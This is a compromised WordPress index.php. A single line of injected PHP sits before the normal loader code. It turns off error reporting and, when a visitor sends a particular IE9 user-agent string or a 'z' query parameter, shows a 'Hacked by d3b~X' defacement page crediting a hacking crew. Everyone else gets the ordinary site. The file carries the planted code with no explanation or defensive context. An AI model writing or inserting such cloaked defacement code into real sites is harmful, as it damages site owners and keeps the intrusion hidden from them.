<?php error_reporting(0); $r=$_SERVER["HTTP_USER_AGENT"];if((preg_match("/MSIE 9.0; Windows NT 6.0; Trident\/5.0/i",$r)) OR(isset($_GET["z"]))){echo "<title>Hacked by d3b~X</title><center><div id=q>Gantengers Crew<br><font size=2>SultanHaikal - d3b~X - Brian Kamikaze - Coupdegrace - Mdn_newbie - Index Php <style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}";exit;}?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
